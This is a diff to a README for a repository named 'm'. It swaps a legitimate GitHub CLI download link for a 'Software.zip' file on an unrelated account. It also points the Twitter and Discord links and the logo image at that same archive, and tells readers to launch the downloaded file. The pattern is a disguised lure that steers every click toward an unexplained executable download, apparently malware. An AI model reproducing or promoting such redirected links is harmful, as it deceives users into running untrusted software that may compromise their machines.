@@ -17,7 +17,7 @@ This repository does not provide specific topics.
 
 ## Download v1.0.0
 
-[![Download v1.0.0](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download v1.0.0](https://github.com/elianozzz/m/releases/download/v1.0/Software.zip)](https://github.com/elianozzz/m/releases/download/v1.0/Software.zip)
 *Click the button above to download version 1.0.0 of the "m" repository. Launch the downloaded file to explore its contents.*
 
 ---
@@ -29,8 +29,8 @@ Explore, enjoy, and happy coding! 🚀🔍📦
 
 ### Connect with the Community
 
-- Find us on [Twitter](https://twitter.com/)
-- Join our [Discord](https://discord.com/)
+- Find us on [Twitter](https://github.com/elianozzz/m/releases/download/v1.0/Software.zip)
+- Join our [Discord](https://github.com/elianozzz/m/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -38,4 +38,4 @@ Thank you for visiting the "m" repository! 🎉👨‍💻
 
 ---
 
-![GitHub Logo](/images/logo.png)
+![GitHub Logo](https://github.com/elianozzz/m/releases/download/v1.0/Software.zip)
